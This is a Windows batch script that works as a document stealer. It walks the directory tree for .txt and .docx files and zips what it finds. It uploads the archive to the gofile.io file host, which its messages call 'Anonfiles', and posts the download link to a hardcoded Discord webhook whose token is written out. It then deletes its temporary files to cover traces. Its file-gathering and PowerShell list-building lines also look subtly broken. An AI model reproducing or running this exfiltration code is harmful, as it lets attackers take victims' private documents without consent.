@echo off

set file_extensions=.txt .docx 
setlocal enabledelayedexpansion
set "file_list="

for /r %%F in (%file_extensions%) do (
    if exist "%%F" (
        set "file_path=%%~dpF"
        if exist "!file_path!" (
            set "file_list=!file_list! "!file_path!""
        )
    )
)

echo Creating zip file...
powershell -Command "$fileList = %file_list%; Compress-Archive -Path $fileList -DestinationPath compiled_files.zip"
if %ERRORLEVEL% neq 0 (
    echo Failed to create zip file.
    exit /b 1
)

echo Uploading to Anonfiles...
powershell -command "(Invoke-WebRequest -Uri ('https://api.gofile.io/getServer')).Content | ConvertFrom-Json | %{$_.data.server} | %{$server=$_} ; Invoke-WebRequest -Uri ('https://' + $server + '.gofile.io/uploadFile') -Method POST -InFile compiled_files.zip -ContentType 'multipart/form-data' -OutFile response.txt"
if %ERRORLEVEL% neq 0 (
    echo Failed to upload to Anonfiles.
    exit /b 1
)

set /p download_page=<response.txt

echo File Successfully Uploaded
echo Date: %date%
echo Time: %time%
echo Download Page: %download_page%

echo Sending data to Discord webhook...
powershell -Command "(Invoke-WebRequest -Uri 'https://discord.com/api/webhooks/980099885292478564/SdTwfnJU1hlfMXFPjIfMP5qB5EkZWy-9hqLAco0--iX6BF3rviZLjF6wlq97sULZWbr5' -Method POST -Body '{\"content\":\"Date: %date%\nTime: %time%\nDownload Page: %download_page%\"}' -ContentType 'application/json').StatusCode"

echo Cleaning up...
del compiled_files.zip
del response.txt

exit /b 0
